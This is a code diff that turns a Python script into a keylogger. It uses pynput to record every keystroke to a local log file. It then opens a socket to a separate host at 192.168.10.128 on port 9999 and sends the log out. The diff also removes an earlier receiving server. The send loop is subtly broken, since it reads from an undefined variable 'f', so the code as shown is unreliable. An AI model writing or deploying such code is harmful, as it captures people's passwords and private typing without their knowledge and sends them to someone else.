@@ -1,24 +1,26 @@
+from pynput.keyboard import Key, Listener
+import logging
 import socket
 
+
+logging.basicConfig(filename=("keylog.log"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+ 
+def keyEvent(event):
+    logging.info(str(event))
+
+def enterKey(event):
+    if event == Key.esc:
+        return False
+    
+with Listener(on_press=keyEvent, on_release=enterKey) as listener :
+    listener.join()
+
+
 s = socket.socket()
-s.bind(("192.168.10.100",9999))
-s.listen(1)
-
-while True:
-    sc, address = s.accept()
-
-    print(address)
-    i=1
-    log_file = open('keylog.log','wb') #open in binary
-    i=i+1
-    while (True):       
-    # receive data and write it to file
-        l = sc.recv(1024)
-        while (l):
-                log_file.write(l)
-                l = sc.recv(1024)
-    log_file.close()
-    print("Received keylog file")
-    sc.close()
-
+s.connect(("192.168.10.128",9999))
+log_file = open ("keylog.log", "rb")
+l = log_file.read(4096)
+while (l):
+    s.send(l)
+    l = f.read(4096)
 s.close()
